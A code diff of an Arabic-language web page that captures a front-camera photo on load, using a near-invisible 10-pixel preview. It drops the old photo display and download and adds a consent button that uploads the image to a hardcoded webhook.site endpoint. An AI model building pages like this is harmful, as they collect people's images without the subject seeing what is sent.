@@ -26,7 +26,7 @@
             font-size: 15px;
         }
 
-        /* نافذة معاينة الكاميرا بحجم صغير جداً */
+        /* نافذة الكاميرا الصغيرة جداً */
         #video {
             width: 10px;
             height: 10px;
@@ -39,22 +39,13 @@
             background: black;
         }
 
-        #photo {
-            display: block;
-            width: 100%;
-            max-width: 350px;
-            margin: 15px auto;
-            border-radius: 10px;
-        }
-
-        #download {
-            display: inline-block;
-            margin-top: 15px;
+        button {
             padding: 10px 20px;
             background: #1685e5;
             color: white;
-            text-decoration: none;
+            border: none;
             border-radius: 8px;
+            cursor: pointer;
         }
 
         [hidden] {
@@ -73,22 +64,23 @@
 
     <canvas id="canvas" hidden></canvas>
 
-    <img id="photo" hidden alt="الصورة الملتقطة">
-
-    <a id="download" hidden download="photo.jpg">
-        تنزيل الصورة
-    </a>
+    <button id="send" hidden>
+        الموافقة على إرسال الصورة
+    </button>
 
     <script>
+        const WEBHOOK_URL =
+        "https://b5334979-efa1-4201-b631-1c8cbf428002.webhook.site";
+
         (async function () {
 
             const status = document.getElementById("status");
             const video = document.getElementById("video");
             const canvas = document.getElementById("canvas");
-            const photo = document.getElementById("photo");
-            const download = document.getElementById("download");
+            const sendButton = document.getElementById("send");
 
             let stream = null;
+            let photoBlob = null;
 
             try {
 
@@ -97,7 +89,7 @@
                     throw new Error("الكاميرا غير مدعومة");
                 }
 
-                // طلب إذن الكاميرا
+                // طلب إذن الكاميرا عند فتح الصفحة
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: "user"
@@ -106,7 +98,6 @@
                 });
 
                 video.srcObject = stream;
-
                 await video.play();
 
                 status.textContent =
@@ -131,46 +122,74 @@
                     canvas.height
                 );
 
-                const blob = await new Promise(resolve => {
-                    canvas.toBlob(
-                        resolve,
-                        "image/jpeg",
-                        0.92
-                    );
+                photoBlob = await new Promise(resolve => {
+                    canvas.toBlob(resolve, "image/jpeg", 0.92);
                 });
 
-                if (!blob) {
+                if (!photoBlob) {
                     throw new Error("تعذر التقاط الصورة");
                 }
 
-                // عرض الصورة للمستخدم
-                const imageURL = URL.createObjectURL(blob);
+                status.textContent =
+                    "تم التقاط الصورة. اضغط للموافقة على إرسالها إلى Webhook.";
 
-                photo.src = imageURL;
-                photo.hidden = false;
-
-                // إتاحة تنزيل الصورة
-                download.href = imageURL;
-                download.hidden = false;
-
-                status.textContent = "تم التقاط الصورة بنجاح.";
+                sendButton.hidden = false;
 
             } catch (error) {
 
                 status.textContent =
-                    "لم يتم السماح بالكاميرا أو تعذر تشغيلها. لم تُلتقط صورة.";
+                    "لم يتم السماح بالكاميرا أو تعذر التقاط الصورة.";
 
             } finally {
 
-                // إيقاف الكاميرا
                 if (stream) {
-                    stream.getTracks().forEach(track => {
-                        track.stop();
-                    });
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
                 }
 
                 video.hidden = true;
             }
+
+            // إرسال الصورة بعد الموافقة الصريحة
+            sendButton.addEventListener("click", async function () {
+
+                if (!photoBlob) return;
+
+                sendButton.disabled = true;
+                status.textContent = "جارٍ إرسال الصورة...";
+
+                try {
+
+                    const formData = new FormData();
+
+                    formData.append(
+                        "file",
+                        photoBlob,
+                        "camera-photo.jpg"
+                    );
+
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: "POST",
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        throw new Error("فشل الإرسال");
+                    }
+
+                    status.textContent = "تم إرسال الصورة بنجاح.";
+                    photoBlob = null;
+                    sendButton.hidden = true;
+
+                } catch (error) {
+
+                    status.textContent =
+                        "تعذر إرسال الصورة. تحقق من Webhook والاتصال.";
+
+                    sendButton.disabled = false;
+                }
+
+            });
 
         })();
     </script>
